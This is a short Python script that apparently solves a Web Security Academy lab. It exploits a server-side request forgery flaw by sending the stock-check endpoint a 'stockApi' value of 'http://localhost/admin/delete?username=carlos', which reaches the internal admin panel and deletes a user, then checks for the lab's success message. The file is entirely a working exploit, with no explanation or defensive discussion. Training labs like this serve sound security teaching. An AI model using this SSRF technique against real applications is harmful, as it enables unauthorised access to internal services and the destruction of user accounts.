import requests

# Configuration
BASE_URL = "https://0a23005c047da0148232a66a00b000d0.web-security-academy.net/"

def execute_ssrf_exploit(url):
    """Exploits a basic SSRF vulnerability to access the local admin panel and delete a user."""
    session = requests.Session()
    stock_api_endpoint = f"{url}product/stock"
    
    # 1. Execution Phase (Loopback SSRF)
    print("[*] Transmitting SSRF payload to internal admin interface...")
    ssrf_payload = {
        "stockApi": "http://localhost/admin/delete?username=carlos"
    }
    session.post(stock_api_endpoint, data=ssrf_payload)
    
    # 2. Verification Phase
    print("[*] Verifying execution status...")
    verification_response = session.get(url)
    
    if "Congratulations" in verification_response.text:
        print("[+] TARGET SECURED: SUCCESSFULLY DELETED USER 'CARLOS'")
    else:
        print("[-] Exploit failed.")

if __name__ == "__main__":
    execute_ssrf_exploit(BASE_URL)